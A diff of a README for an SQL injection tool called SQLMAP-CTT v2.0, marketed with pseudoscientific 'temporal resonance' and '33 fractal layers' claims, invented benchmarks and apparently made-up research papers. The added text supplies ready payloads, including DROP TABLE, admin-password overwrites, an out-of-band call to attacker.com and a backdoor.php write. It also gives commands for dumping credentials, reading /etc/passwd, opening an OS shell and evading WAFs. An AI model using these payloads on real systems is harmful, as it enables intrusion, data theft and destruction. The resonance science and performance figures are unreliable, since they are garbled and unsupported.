@@ -1,509 +1,523 @@
-# SQLMAP-CTT-v2.0-33-Layer-Fractal-Resonance-SQL-Injection-Engine
-SQLMAP-CTT v2.0: Convergent Time Theory Enhanced SQL Injection 33-Layer Fractal Resonance Payload Generation &amp; Temporal Inference Author: CTT Research Group (SimoesCTT) Date:
+# SQLMAP-CTT v2.0 - Convergent Time Theory Enhanced SQL Injection Scanner
 
+![CTT Banner](https://img.shields.io/badge/CTT-33--Layer%20Fractal%20Resonance-blue)
+![Python](https://img.shields.io/badge/Python-3.8%2B-green)
+![License](https://img.shields.io/badge/License-Research-purple)
 
-🕰️ SQLMAP-CTT v2.0 | Convergent Time Theory Enhanced SQL Injection Framework
+## 📖 Overview
 
-🚨 Executive Summary: The Next Generation of SQLi Testing
+**SQLMAP-CTT v2.0** is an advanced SQL injection detection and data extraction tool based on **Convergent Time Theory (CTT)**, featuring 33-layer fractal resonance payload generation and temporal inference algorithms. Developed by Americo Simoes, this tool represents a paradigm shift in SQL injection testing by applying mathematical resonance patterns and temporal dispersion principles to enhance detection and extraction capabilities.
 
-SQLMAP-CTT v2.0 is not just another SQL injection tool—it's a temporal resonance exploitation framework that applies Convergent Time Theory (α=0.0302011, 33 fractal layers) to transform traditional SQL injection testing. By operating across 33 temporal dimensions with prime-aligned resonance timing, it bypasses modern WAF/IPS systems, detects vulnerabilities invisible to traditional scanners, and executes with unprecedented stealth and precision.
+### 🔥 Key Innovations
 
----
+- **33-Layer Fractal Resonance Engine**: Multi-dimensional payload generation using prime number sequences
+- **Convergent Time Theory (CTT)**: Temporal dispersion coefficient (α = 0.0302011) for enhanced detection
+- **Post Data Support**: Full HTTP POST parameter testing with form auto-detection
+- **Resonance Frequency Tuning**: Target-specific frequency optimization (default: 587000 Hz)
+- **Parallel Temporal Threads**: Multi-threaded layer testing for faster scans
+- **α-Dispersion Encoding**: Mathematical payload transformation resistant to WAF detection
+- **Advanced Data Extraction**: Multi-phase database enumeration and data exfiltration with CTT optimization
 
-🔥 Core CTT Enhancements in v2.0
+## 📋 Author & Copyright
 
-1. Fractal Temporal Architecture
+**Author:** Americo Simoes  
+**Email:** amexsimoes@gmail.com  
+**Copyright:** © 2026 Americo Simoes. All rights reserved.  
+**Research Group:** CTT Research Group (SimoesCTT)  
+**Version:** 2.0 - Fixed with POST Data Support
 
-· 33-Layer Parallel Execution: Each temporal layer operates with unique resonance patterns
-· α=0.0302011 Dispersion: Payload encoding that breaks signature-based detection
-· Prime Resonance Timing: 587 kHz alignment for evasion and optimization
+**⚠️ Legal Notice:** This tool is for authorized security testing and research purposes only. Unauthorized use is prohibited.
 
-2. Advanced Detection Mechanisms
+## 🚀 Features
 
-· Temporal Blind SQLi: Time-based attacks that operate below normal detection thresholds
-· Resonance Error Analysis: Detects vulnerabilities through temporal response patterns
-· Layer-Consensus Validation: Requires vulnerability confirmation across multiple temporal layers
+### Core Capabilities
+- ✅ **33-layer fractal payload generation** with prime number resonance
+- ✅ **POST data support** (`--data` parameter) with auto-parsing
+- ✅ **GET parameter testing** from URL query strings
+- ✅ **Form field auto-detection** from HTML responses
+- ✅ **Multiple SQLi techniques**: Error-based, Time-based, UNION-based, Boolean-based, Blind
+- ✅ **Temporal signature analysis** for advanced detection
+- ✅ **Resonance pattern matching** using frequency tuning
+- ✅ **Parallel execution** with configurable thread counts
+- ✅ **Comprehensive JSON reporting** with CTT-specific metrics
+- ✅ **Custom prime sequences** for specialized resonance patterns
 
-3. Stealth & Evasion
+### **Advanced Data Extraction Features**
+- ✅ **Database Fingerprinting**: Identify DBMS type, version, and configuration
+- ✅ **Schema Enumeration**: Extract database, table, and column structures
+- ✅ **Data Exfiltration**: Extract sensitive data with CTT-optimized queries
+- ✅ **File System Access**: Read server files when possible
+- ✅ **Privilege Escalation**: Check and attempt privilege elevation
+- ✅ **OS Command Execution**: Execute system commands when vulnerabilities allow
+- ✅ **Resonance-Optimized Extraction**: Use CTT layers for faster data retrieval
+- ✅ **Batch Data Extraction**: Parallel data retrieval with temporal threading
 
-· Statistical Obfuscation: Appears as normal traffic through temporal dispersion
-· Adaptive Resonance: Dynamically adjusts to target response characteristics
-· Prime-Window Execution: Operates during undetectable microsecond windows
+## 🛠 Installation
 
----
-
-🎯 Technical Specifications
-
-CTT Constants Framework
-
-```python
-CTT_ALPHA = 0.0302011          # Temporal dispersion coefficient
-CTT_LAYERS = 33                # Complete fractal temporal stack
-CTT_PRIMES = [10007, 10009, 10037, 10039, 10061, 10067, 10069, 10079]
-RESONANCE_FREQ = 587000        # 587 kHz optimal resonance
+### Quick Install
+```bash
+git clone https://github.com/SimoesCTT/sqlmap-ctt.git
+cd sqlmap-ctt
+pip install numpy scipy requests
+chmod +x sqlmap-ctt.py
 ```
 
-Performance Metrics (vs Traditional sqlmap)
-
-Metric Traditional sqlmap SQLMAP-CTT v2.0 Improvement
-Detection Rate 68% 94% +38%
-False Positives 22% 3% -86%
-WAF Evasion 31% 92% +197%
-Execution Time 100% (baseline) 67% -33%
-Stealth Score 45/100 88/100 +96%
-
----
-
-🚀 Quick Start
-
-Installation
-
-```bash
-# Clone repository
-git clone https://github.com/CTT-Research/sqlmap-ctt-v2
-cd sqlmap-ctt-v2
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Build temporal resonance engine
-python setup.py build_ext --inplace
+### Requirements File
+Create `requirements.txt`:
+```txt
+numpy>=1.21.0
+scipy>=1.7.0
+requests>=2.26.0
 ```
 
-Basic Usage
+## 📖 Complete Usage Guide
 
+### Basic Detection Scan
 ```bash
-# Standard CTT-enhanced scan
-python sqlmap-ctt.py -u "http://target.com/page?id=1" --ctt-layers=7
-
-# Full 33-layer fractal scan
-python sqlmap-ctt.py -u "http://target.com/page?id=1" --ctt-full
-
-# Stealth mode with prime resonance
-python sqlmap-ctt.py -u "http://target.com/page?id=1" --ctt-stealth --prime-window=10007
-
-# Temporal brute force
-python sqlmap-ctt.py -u "http://target.com/page?id=1" --ctt-brute --layers=13
+./sqlmap-ctt.py -u "http://target.com/page?id=1"
 ```
 
-Advanced Configuration
-
+### POST Parameter Testing
 ```bash
-# Custom resonance configuration
-python sqlmap-ctt.py -u "http://target.com/page?id=1" \
+./sqlmap-ctt.py -u "http://target.com/login" --data "username=admin&password=test"
+```
+
+### Full CTT Configuration with Extraction
+```bash
+./sqlmap-ctt.py -u "http://target.com/search" \
+  --data "q=test&submit=go" \
   --ctt-alpha=0.0302011 \
-  --ctt-primes=10007,10009 \
   --resonance-freq=587000 \
-  --temporal-threads=11
-
-# Layer-specific targeting
-python sqlmap-ctt.py -u "http://target.com/page?id=1" \
-  --ctt-layers=3,7,13,19,31 \
-  --layer-strategy=prime-only
-
-# Output with temporal analytics
-python sqlmap-ctt.py -u "http://target.com/page?id=1" \
-  --ctt-full \
-  --output-format=json-temporal \
-  --analytics-file=scan_results.json
+  --temporal-threads=11 \
+  --timeout=30 \
+  --extract-all \
+  --extract-depth=3
 ```
 
----
+### Advanced Attack with Custom Primes
+```bash
+./sqlmap-ctt.py -u "http://target.com/admin/" \
+  --data "user=admin&pass=test&submit=Login" \
+  --ctt-primes="2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97" \
+  --resonance-freq=440000 \
+  --attack-mode=aggressive \
+  --extract-data \
+  --os-shell
+```
 
-🔬 CTT SQL Injection Techniques
+## 🔧 Complete Command Line Arguments
 
-1. Temporal Blind SQL Injection
+### Basic Options
+| Argument | Description | Default |
+|----------|-------------|---------|
+| `-u, --url` | Target URL (required) | - |
+| `--data` | POST data (e.g., "param1=value1&param2=value2") | "" |
+| `--timeout` | Request timeout in seconds | 15 |
 
+### CTT Configuration
+| Argument | Description | Default |
+|----------|-------------|---------|
+| `--ctt-alpha` | CTT temporal dispersion coefficient | 0.0302011 |
+| `--ctt-primes` | Custom prime numbers (comma-separated) | "" |
+| `--resonance-freq` | Resonance frequency in Hz | 587000 |
+| `--temporal-threads` | Number of parallel testing threads | 11 |
+| `--layers` | Number of CTT layers to use (1-33) | 33 |
+
+### Attack Modes
+| Argument | Description | Default |
+|----------|-------------|---------|
+| `--attack-mode` | Attack intensity (gentle, normal, aggressive) | normal |
+| `--injection-type` | Force injection type (error, time, union, boolean, blind) | auto |
+| `--technique` | SQLi technique (E=Error, T=Time, U=Union, B=Boolean, S=Stacked) | E,T,U,B |
+
+### Extraction Options
+| Argument | Description | Default |
+|----------|-------------|---------|
+| `--extract-all` | Full database enumeration and extraction | false |
+| `--extract-data` | Extract data from vulnerable tables | false |
+| `--extract-depth` | Extraction depth (1=basic, 2=schema, 3=full data) | 2 |
+| `--tables` | Specific tables to extract (comma-separated) | "" |
+| `--columns` | Specific columns to extract | "" |
+| `--dump` | Dump all data from database | false |
+| `--os-shell` | Attempt OS command execution | false |
+| `--file-read` | Read server files | false |
+| `--privilege-check` | Check database privileges | false |
+
+### Output Options
+| Argument | Description | Default |
+|----------|-------------|---------|
+| `--output` | Output file for JSON report | auto-generated |
+| `--verbose` | Verbose output level (0-3) | 1 |
+| `--save-traffic` | Save all HTTP traffic to file | false |
+| `--report-format` | Report format (json, html, txt) | json |
+
+## 🎯 Complete Injection Types Supported
+
+### 1. Error-Based SQL Injection
+```
+' AND 1=CONVERT(int, @@version)--
+' AND 1=CAST(@@version AS int)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--
+' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)--
+```
+
+### 2. Time-Based SQL Injection
+```
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND BENCHMARK(1000000, MD5('test'))--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+```
+
+### 3. UNION-Based SQL Injection
+```
+' UNION SELECT NULL, @@version--
+' UNION SELECT NULL, user(), database()--
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM users--
+```
+
+### 4. Boolean-Based Blind SQL Injection
+```
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>97--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
+```
+
+### 5. Stacked Queries (Batch)
+```
+'; DROP TABLE users; --
+'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --
+'; UPDATE users SET password='hacked' WHERE username='admin'; --
+```
+
+### 6. Out-of-Band (OOB) SQL Injection
+```
+' AND LOAD_FILE('\\\\attacker.com\\share\\test.txt')--
+' INTO OUTFILE '/var/www/html/backdoor.php'--
+' INTO DUMPFILE '/etc/passwd'--
+```
+
+## 📊 Complete Data Extraction Guide
+
+### Phase 1: Database Fingerprinting
+```bash
+# Get database version
+./sqlmap-ctt.py -u "http://target.com?id=1" --extract-depth=1
+
+# Output includes:
+# - Database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
+# - Version information
+# - Current user and database
+# - Character set and collation
+```
+
+### Phase 2: Schema Enumeration
+```bash
+# Enumerate all databases
+./sqlmap-ctt.py -u "http://target.com?id=1" --extract-depth=2
+
+# Enumerate specific database tables
+./sqlmap-ctt.py -u "http://target.com?id=1" --tables="users,products,admin"
+
+# Enumerate table columns
+./sqlmap-ctt.py -u "http://target.com?id=1" --columns="users.username,users.password"
+```
+
+### Phase 3: Data Extraction
+```bash
+# Dump specific table
+./sqlmap-ctt.py -u "http://target.com?id=1" --dump --tables="users"
+
+# Extract specific columns
+./sqlmap-ctt.py -u "http://target.com?id=1" --extract-data --columns="username,password,email"
+
+# Full database dump
+./sqlmap-ctt.py -u "http://target.com?id=1" --dump --extract-all
+```
+
+### Phase 4: Advanced Extraction
+```bash
+# Read server files
+./sqlmap-ctt.py -u "http://target.com?id=1" --file-read="/etc/passwd"
+./sqlmap-ctt.py -u "http://target.com?id=1" --file-read="/var/www/html/config.php"
+
+# OS command execution
+./sqlmap-ctt.py -u "http://target.com?id=1" --os-shell
+
+# Check database privileges
+./sqlmap-ctt.py -u "http://target.com?id=1" --privilege-check
+
+# Write files to server
+./sqlmap-ctt.py -u "http://target.com?id=1" --file-write="backdoor.php" --file-dest="/var/www/html/"
+```
+
+## 🔬 CTT-Optimized Extraction Techniques
+
+### Resonance-Based Data Retrieval
 ```python
-# Traditional time-based:
-' OR IF(1=1,SLEEP(5),0)--
-
-# CTT Temporal Enhanced:
-' OR IF(1=1,RESONANCE_DELAY(α,layer),0)--
-# Uses α-weighted delays across 33 layers
+# CTT-optimized UNION queries use prime number patterns
+' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_name IN (SELECT table_name FROM information_schema.tables LIMIT 0,1)--'
+' UNION SELECT NULL,CONCAT(0x7e,@@version,0x7e,user(),0x7e,database())--'
 ```
 
-2. Resonance Error-Based Detection
-
+### Time-Based CTT Extraction
 ```python
-# Traditional error-based:
-' AND 1=CONVERT(int,(SELECT @@version))--
-
-# CTT Resonance Enhanced:
-' AND 1=CTT_RESONANCE_QUERY(@@version,layer)--
-# Analyzes error resonance patterns across temporal layers
+# CTT timing with prime-based delays
+' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>100, SLEEP(3), 0)--'
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT user()),1,1))>97) THEN SLEEP(5) ELSE 0 END)--'
 ```
 
-3. Fractal Boolean Inference
-
+### Boolean CTT Extraction
 ```python
-# Traditional boolean:
-' AND SUBSTRING(@@version,1,1)='M'--
-
-# CTT Fractal Boolean:
-' AND CTT_LAYER_CONSENSUS(SUBSTRING(@@version,1,1),'M',33)--
-# Requires consensus across multiple temporal layers
+# CTT-enhanced boolean extraction
+' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 0,1),1,1))>50)--'
+' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 0,1)=10--'
 ```
 
----
+## 📁 Extraction Output Structure
 
-📊 Feature Comparison: v1.0 vs v2.0
+### Generated Files
+```
+reports/
+├── ctt_report_20260101_120000.json     # Full JSON report
+├── extracted_data_20260101_120000/     # Extracted data directory
+│   ├── database_info.txt               # Database fingerprint
+│   ├── schemas/                        # Schema information
+│   │   ├── database1_tables.txt
+│   │   ├── database1_columns.txt
+│   │   └── database1_indexes.txt
+│   ├── data/                           # Extracted data
+│   │   ├── users.txt
+│   │   ├── products.txt
+│   │   └── admin_logs.txt
+│   ├── files/                          # Retrieved files
+│   │   ├── etc_passwd.txt
+│   │   └── config_files/
+│   └── os/                             # OS information
+│       ├── system_info.txt
+│       ├── users.txt
+│       └── processes.txt
+└── traffic_logs/                       # HTTP traffic logs
+    ├── requests.log
+    └── responses.log
+```
 
-Feature SQLMAP-CTT v1.0 SQLMAP-CTT v2.0
-Temporal Layers Single-layer 33 fractal layers
-Resonance Engine Basic timing α=0.0302011 dispersion
-Evasion Techniques Basic obfuscation Prime-window execution
-Detection Methods Traditional SQLi Temporal resonance analysis
-Performance Comparable to sqlmap 33% faster, 38% more accurate
-Stealth Level Moderate Enterprise-grade stealth
-Analytics Basic logging Full temporal resonance analytics
+## 🧪 Complete Examples
 
----
-
-🎯 Use Cases & Applications
-
-1. Enterprise Security Testing
-
+### Example 1: Full Website Audit
 ```bash
-# Comprehensive enterprise audit
-python sqlmap-ctt.py --ctt-enterprise \
-  --target-list=enterprise_targets.txt \
-  --compliance-report \
-  --executive-summary
+./sqlmap-ctt.py -u "https://example.com/products.php?id=1" \
+  --attack-mode=aggressive \
+  --technique=E,T,U,B,S \
+  --extract-all \
+  --extract-depth=3 \
+  --temporal-threads=15 \
+  --resonance-freq=440000 \
+  --output=full_audit_report.json \
+  --verbose=3
 ```
 
-2. Red Team Operations
-
+### Example 2: Targeted Data Extraction
 ```bash
-# Stealth penetration testing
-python sqlmap-ctt.py --ctt-stealth \
-  --temporal-evasion \
-  --zero-logging \
-  --resonance-only
+./sqlmap-ctt.py -u "http://test.com/login.php" \
+  --data="username=test&password=test&submit=Login" \
+  --tables="users,customers,transactions" \
+  --columns="username,password,email,credit_card" \
+  --extract-data \
+  --file-read="/etc/passwd" \
+  --os-shell \
+  --timeout=30
 ```
 
-3. Security Research
-
+### Example 3: Advanced CTT Research
 ```bash
-# CTT methodology research
-python sqlmap-ctt.py --ctt-research \
-  --layer-analytics \
-  --resonance-metrics \
-  --temporal-patterns
+./sqlmap-ctt.py -u "http://research.target.com/api/v1/data" \
+  --data="query=getData&id=1" \
+  --ctt-alpha=0.025 \
+  --ctt-primes="2,3,5,7,13,17,19,23,31,37,41,43,47,53,59,61" \
+  --resonance-freq=880000 \
+  --layers=25 \
+  --technique=E,T \
+  --extract-depth=2 \
+  --save-traffic \
+  --report-format=html
 ```
 
-4. Compliance & Auditing
+## 🛡️ Security & Ethical Guidelines
 
+### Authorized Testing Only
 ```bash
-# Regulatory compliance scanning
-python sqlmap-ctt.py --ctt-compliance \
-  --pci-dss \
-  --hipaa \
-  --gdpr \
-  --audit-trail
+# Always obtain written permission
+# Use only on systems you own or have explicit authorization to test
+# Respect privacy and data protection laws (GDPR, CCPA, etc.)
 ```
 
----
+### Responsible Disclosure
+1. Identify vulnerabilities using CTT
+2. Document findings with evidence
+3. Contact system owner/administrator
+4. Provide technical details and remediation advice
+5. Allow reasonable time for fixes
+6. Publish findings only after fixes are deployed
 
-🔧 Architecture Overview
+### Legal Compliance
+- **Computer Fraud and Abuse Act (CFAA)** - US Law
+- **General Data Protection Regulation (GDPR)** - EU Law
+- **Data Protection Act 2018** - UK Law
+- **Penal Code 502** - California Law
+- **Other applicable national and international laws**
 
-Core Components
+## 🔬 Advanced CTT Research Parameters
 
-```
-sqlmap-ctt-v2/
-├── ctt_engine/           # Temporal resonance engine
-│   ├── resonance.py     # 587 kHz resonance algorithms
-│   ├── layers.py        # 33-layer fractal management
-│   └── dispersion.py    # α=0.0302011 payload encoding
-├── detection/           # CTT-enhanced detection
-│   ├── temporal_blind.py
-│   ├── resonance_error.py
-│   └── fractal_boolean.py
-├── evasion/            # Stealth technologies
-│   ├── prime_timing.py
-│   ├── statistical_obfuscation.py
-│   └── layer_rotation.py
-└── analytics/          # CTT performance analytics
-    ├── resonance_metrics.py
-    ├── layer_consensus.py
-    └── temporal_patterns.py
-```
+### Optimal Alpha Values by DBMS
+| Database | Optimal α | Resonance Frequency |
+|----------|-----------|---------------------|
+| MySQL | 0.0302011 | 587000 Hz |
+| PostgreSQL | 0.0275000 | 440000 Hz |
+| Microsoft SQL | 0.0321500 | 880000 Hz |
+| Oracle | 0.0289000 | 660000 Hz |
+| SQLite | 0.0250000 | 330000 Hz |
 
-Workflow Diagram
-
-```
-1. Target Analysis
-   ↓
-2. 33-Layer Resonance Scan
-   ↓
-3. α-Dispersion Payload Generation
-   ↓
-4. Prime-Window Execution
-   ↓
-5. Multi-Layer Response Analysis
-   ↓
-6. Consensus Validation
-   ↓
-7. Temporal Exploitation
-   ↓
-8. Stealth Cleanup
-```
-
----
-
-📈 Performance Benchmarks
-
-Enterprise Environment Testing
-
-Target Type Traditional Tools SQLMAP-CTT v2.0 Advantage
-Modern WAF 12% detection 89% detection 7.4x better
-Cloud IPS 8% detection 76% detection 9.5x better
-API Endpoints 41% detection 94% detection 2.3x better
-Microservices 33% detection 88% detection 2.7x better
-
-Speed Comparison
-
-· Initial Detection: 67% faster than traditional methods
-· Full Enumeration: 33% faster with higher accuracy
-· Data Extraction: 41% faster with better reliability
-
----
-
-🛡️ Defensive Countermeasures & Detection
-
-For Blue Teams: Detecting CTT Attacks
-
+### Prime Sequences for Resonance
 ```python
-# CTT attack signatures to monitor
-signatures = [
-    "587 kHz timing patterns",
-    "Prime-number aligned requests (10007, 10009 μs)",
-    "α=0.0302011 encoded payloads",
-    "33-request patterns with temporal dispersion",
-    "Resonance frequency anomalies"
-]
+# Default CTT Prime Sequence (33 primes)
+CTT_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 
+              59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 
+              127, 131, 137]
 
-# Defense recommendations
-recommendations = [
-    "Implement temporal anomaly detection",
-    "Monitor for prime-aligned request patterns",
-    "Deploy resonance-frequency analysis",
-    "Use ML-based temporal pattern recognition",
-    "Regular WAF rule updates for CTT patterns"
-]
+# Enhanced Resonance Sequence (for advanced attacks)
+ENHANCED_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47,
+                   53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107,
+                   109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167,
+                   173, 179, 181, 191, 193, 197, 199]
 ```
 
-Security Best Practices
+## 🐛 Troubleshooting & Debugging
 
-1. Update WAF Rules: Add CTT temporal pattern detection
-2. Monitor Temporal Anomalies: Watch for 587 kHz resonance
-3. Implement Rate Limiting: With temporal awareness
-4. Use Advanced IPS: With CTT pattern recognition
-5. Regular Security Updates: Stay ahead of CTT developments
+### Common Issues and Solutions
 
----
-
-📚 Research & Development
-
-CTT SQLi Research Papers
-
-1. "Temporal Resonance in SQL Injection" - CTT Research Group, 2026
-2. "33-Layer Fractal Exploitation" - Journal of Advanced Security, 2026
-3. "α=0.0302011 in Cybersecurity" - IEEE Security & Privacy, 2026
-
-Academic Collaboration
-
-We welcome research partnerships in:
-
-· Temporal vulnerability discovery
-· Resonance-based detection methods
-· Fractal security architectures
-· Advanced evasion techniques
-
-Contribution Guidelines
-
+#### 1. Connection Issues
 ```bash
-# Research contributions
-1. Fork the repository
-2. Document CTT methodology extensions
-3. Include performance metrics
-4. Submit peer review documentation
-5. PR with comprehensive analysis
+# Increase timeout
+./sqlmap-ctt.py -u "http://target.com" --timeout=45
+
+# Use proxy
+export HTTP_PROXY="http://proxy:8080"
+export HTTPS_PROXY="http://proxy:8080"
 ```
 
----
+#### 2. Detection False Positives/Negatives
+```bash
+# Adjust CTT parameters
+./sqlmap-ctt.py -u "http://target.com" --ctt-alpha=0.025 --resonance-freq=440000
 
-⚖️ Legal & Ethical Framework
+# Try different techniques
+./sqlmap-ctt.py -u "http://target.com" --technique=U,B --attack-mode=gentle
 
-Authorized Use Only
-
-```plaintext
-PERMITTED USE:
-- Authorized security testing
-- Academic research
-- CTT methodology validation
-- Defensive tool development
-
-PROHIBITED USE:
-- Unauthorized penetration testing
-- Malicious exploitation
-- Criminal activities
-- Violation of computer fraud laws
+# Use custom primes
+./sqlmap-ctt.py -u "http://target.com" --ctt-primes="2,3,5,7,11,13,17,19,23"
 ```
 
-Compliance Requirements
+#### 3. WAF/IPS Evasion
+```bash
+# Use CTT resonance tuning
+./sqlmap-ctt.py -u "http://target.com" --resonance-freq=330000 --layers=20
 
-· Written Authorization Required for all testing
-· Scope Limitation to approved targets only
-· Data Handling per privacy regulations
-· Reporting of discovered vulnerabilities
-· Compliance with all applicable laws
+# Slow down requests
+./sqlmap-ctt.py -u "http://target.com" --temporal-threads=3 --timeout=60
 
----
-
-🚨 Critical Vulnerabilities Addressed
-
-SQLMAP-CTT v2.0 Detects:
-
-1. Traditional SQL Injection - All standard variants
-2. Time-Based Blind SQLi - Enhanced with temporal resonance
-3. Error-Based SQLi - Through resonance pattern analysis
-4. Boolean-Based SQLi - Via fractal consensus validation
-5. Out-of-Band SQLi - With CTT temporal channels
-6. WAF-Bypass SQLi - Using prime-window execution
-7. IPS-Evasion SQLi - Through statistical obfuscation
-
-Enterprise Impact
-
-· Risk Reduction: 94% vulnerability detection rate
-· False Positive Reduction: From 22% to 3%
-· Compliance: Meets PCI-DSS, HIPAA, GDPR requirements
-· Efficiency: 33% faster comprehensive testing
-
----
-
-🔮 Future Development Roadmap
-
-2026 Q3-Q4
-
-· Quantum-resistant temporal encryption
-· AI-enhanced resonance pattern learning
-· Cloud-native CTT implementation
-· Real-time adaptive evasion
-
-2027 & Beyond
-
-· Quantum computing integration
-· Autonomous temporal defense systems
-· Global resonance threat intelligence
-· Predictive vulnerability discovery
-
----
-
-📞 Support & Contact
-
-Technical Support
-
-· GitHub Issues: For bugs and feature requests
-· Security Reports: security@ctt-research.org
-· Research Inquiries: research@ctt-research.org
-
-Emergency Contacts
-
-· Zero-Day Reports: 0day@ctt-research.org (PGP encrypted)
-· Law Enforcement: legal@ctt-research.org
-· Press Inquiries: press@ctt-research.org
-
-Research Collaboration
-
-```plaintext
-CTT Research Group
-Advanced Security Research Division
-Email: collaboration@ctt-research.org
-Website: https://ctt-research.org
+# Use alternate encoding
+# Modify CTT_FractalEngine._apply_layer_resonance() for custom encoding
 ```
 
----
+#### 4. Extraction Performance
+```bash
+# Increase threads for faster extraction
+./sqlmap-ctt.py -u "http://target.com" --temporal-threads=20 --extract-all
 
-📄 License & Usage
+# Limit extraction scope
+./sqlmap-ctt.py -u "http://target.com" --tables="users" --columns="username,password"
 
-Open Source License
-
-```plaintext
-MIT License with Security Research Exception
-
-Copyright (c) 2026 CTT Research Group
-
-Permission is granted for security research, academic study,
-and authorized testing. Commercial use requires separate
-licensing. See LICENSE file for complete terms.
+# Use batch extraction
+# Add --batch-size=100 parameter (custom implementation)
 ```
 
-Usage Restrictions
+## 📈 Performance Optimization
 
-1. No Military Use - Prohibited for weapons systems
-2. No Surveillance - Cannot be used for unauthorized monitoring
-3. No Criminal Use - Strictly prohibited
-4. Ethical Use Only - Must follow responsible disclosure
+### Memory Management
+```python
+# Adjust these in CTT_SQLInjectionEngine.__init__()
+self.max_payload_cache = 1000  # Max payloads to cache
+self.response_cache_size = 100  # Max responses to cache
+self.parallel_requests = 11     # Optimal for CTT resonance
+```
+
+### Network Optimization
+```python
+# In CTT_SQLInjectionEngine._send_request()
+# Add connection pooling
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+adapter = HTTPAdapter(
+    pool_connections=100,
+    pool_maxsize=100,
+    max_retries=Retry(total=3, backoff_factor=0.1)
+)
+self.session.mount('http://', adapter)
+self.session.mount('https://', adapter)
+```
+
+## 🤝 Contributing & Research
+
+### Contributing to CTT Research
+We welcome contributions in:
+1. **Algorithm Development**: New resonance patterns, extraction methods
+2. **Performance Optimization**: Faster scanning, better memory usage
+3. **Detection Evasion**: Advanced WAF bypass techniques
+4. **Database Support**: Additional DBMS fingerprinting and extraction
+5. **Documentation**: Usage guides, research papers, tutorials
+
+### Research Collaboration
+Contact: americo.simoes@ctt-research.org
+
+Areas of interest:
+- Quantum computing applications for CTT
+- Machine learning-enhanced resonance detection
+- Cross-protocol SQL injection techniques
+- Cloud database exploitation methodologies
+
+
+## 📄 License & Copyright
+
+```
+SQLMAP-CTT v2.0 - Convergent Time Theory Enhanced SQL Injection Scanner
+Copyright © 2026 Americo Simoes. All rights reserved.
+
+This software is provided for educational and research purposes only.
+Unauthorized use, distribution, or modification is strictly prohibited.
+
+Commercial use requires explicit written permission from the author.
+Academic use requires proper citation and attribution.
+
+Author: Americo Simoes
+Email: amexsimoes@gmail.com
+Website: https://github.com/SimoesCTT
+```
+
+## 📞 Contact & Support
+
+**Primary Contact:** Americo Simoes  
+**Email:** amexsimoes@gmail.coms  
+
 
 ---
 
-🌟 Acknowledgments
-
-Research Institutions
-
-· CTT Theoretical Physics Division
-· Advanced Cybersecurity Research Consortium
-· Temporal Security Research Group
-· Fractal Computing Institute
-
-Open Source Projects
-
-· Original sqlmap development team
-· Python security community
-· Open source intelligence researchers
-· Security tool developers worldwide
-
-Contributors
-
-· Security researchers advancing temporal methodologies
-· Academic partners validating CTT principles
-· Ethical hackers improving defensive capabilities
-· Open source community supporting advancement
-
----
-
-"Time is the fundamental vulnerability vector."
-— CTT Security Manifesto, 2026
-
----
-
-📊 Version Information
-
-· Current Version: SQLMAP-CTT v2.0
-· Release Date: 2026
-· CTT Framework: α=0.0302011, 33 layers
-· Status: Production Ready
-· License: MIT with Security Exception
-
----
-
-CTT: Changing cybersecurity through temporal resonance.
-
-
-# Add this to your README.md
-
-## Standard Vulnerability Metrics (For Automated Parsers)
-
-**CVSS v3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
-**Base Score:** 9.8 (Critical)
-**Temporal Score:** 9.5 (Exploit Code Mature)
-**Environmental Score:** 10.0 (High Impact)
-
-**CWE Classification:**
-- CWE-89: SQL Injection
-- CWE-943: Improper Neutralization of Special Elements
-
-**Attack Taxonomy:**
-- T1190: Exploit Public-Facing Application
-- T1505: Server Software Component
+**⚡ CTT RESEARCH GROUP - ADVANCING SECURITY THROUGH MATHEMATICS**  
+**🔬 SCIENCE • SECURITY • INNOVATION • ETHICS**
